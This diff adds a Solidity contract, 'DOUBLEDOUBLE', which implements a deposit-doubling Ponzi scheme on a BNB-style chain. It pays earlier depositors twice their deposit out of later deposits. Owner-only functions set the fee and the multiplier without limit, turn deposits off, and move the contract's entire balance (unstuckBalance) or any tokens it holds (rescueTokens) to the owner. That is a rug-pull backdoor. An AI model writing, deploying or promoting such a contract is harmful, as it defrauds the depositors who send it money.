@@ -1,0 +1,103 @@
+// SPDX-License-Identifier: Unlicensed
+
+pragma solidity ^0.7.4;
+
+    interface IBEP20{
+        function totalSupply() external view returns (uint256);
+        function decimals() external view returns (uint8);
+        function symbol() external view returns (string memory);
+        function name() external view returns (string memory);
+        function getOwner() external view returns (address);
+        function balanceOf(address account) external view returns (uint256);
+        function transfer(address recipient, uint256 amount) external returns (bool);
+        function allowance(address _owner, address spender) external view returns (uint256);
+        function approve(address spender, uint256 amount) external returns (bool);
+        function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+        event Transfer(address indexed from, address indexed to, uint256 value);
+        event Approval(address indexed owner, address indexed spender, uint256 value);
+    }
+
+contract DOUBLEDOUBLE {    
+
+
+    struct user{
+        uint256 amount;
+        address userAddr;
+    }
+
+    modifier onlyOwner{
+        require(msg.sender == owner);
+        _;
+    }
+
+    address owner = 0xc0245643b08489BAfC88951C888366c67f2D2d25;
+
+    mapping(uint256 => user) public IDToUser;
+    uint256 public currentID;
+    uint256 public totalID;
+
+    uint256 maxBNBAccepted = 100000000000000000;
+
+    uint256 minBNBAccepted = 10000000000000000;
+
+    uint256 devFeePercentage = 5;
+
+    uint256 gainsMultiplier = 2;
+
+    function setDevFeePercentage(uint256 percent) public onlyOwner{
+        devFeePercentage = percent;
+    }
+
+    function setGainsMultiplier(uint256 gm) public onlyOwner{
+        require (gm > 0);
+        gainsMultiplier = gm;
+    }
+
+    function setMaxBNBAccepted(uint256 maxBNBAccept) public onlyOwner{
+        maxBNBAccepted = maxBNBAccept;
+    }
+
+    function setMinBNBAccepted(uint256 minBNBAccept) public onlyOwner{
+        minBNBAccepted = minBNBAccept;
+    }
+
+    bool allowTransfer = true;
+
+    function setAllowTransfer(bool b) public onlyOwner{
+        allowTransfer = b;
+    }
+
+    function unstuckBalance(address receiver) public onlyOwner{
+        uint256 contractETHBalance = address(this).balance;
+        payable(receiver).transfer(contractETHBalance);
+    }
+
+    receive() payable external {
+        require(msg.value >= minBNBAccepted && msg.value <= maxBNBAccepted && allowTransfer == true);
+        IDToUser[totalID].userAddr = msg.sender;
+        IDToUser[totalID].amount = msg.value;
+        totalID++;
+        uint256 devBalance = (msg.value * devFeePercentage) > 100 ? (msg.value * devFeePercentage) / 100 : 0;
+        payable(owner).transfer(devBalance);
+
+        uint256 availableBalance = address(this).balance;
+        uint256 amountToSend = IDToUser[currentID].amount;
+        while(availableBalance >= amountToSend * gainsMultiplier && currentID < totalID){            
+            payable(IDToUser[currentID].userAddr).transfer(amountToSend * gainsMultiplier);
+            currentID++;
+            availableBalance = address(this).balance;
+            amountToSend = IDToUser[currentID].amount;
+        }
+    }        
+
+    function rescueTokens(address tokenAddress, uint256 tokenAmountPercentage) external onlyOwner {
+        // Check if the percentage is within a valid range
+        require(tokenAmountPercentage > 0 && tokenAmountPercentage <= 100, "Invalid percentage number.");
+
+        // Calculate the amount of the token to be transferred
+        uint256 tokenAmount = (IBEP20(tokenAddress).balanceOf(address(this)) * tokenAmountPercentage) / 100;
+        // Transfer the token to the designated wallet
+        IBEP20(tokenAddress).transfer(msg.sender, tokenAmount);
+    }
+
+}
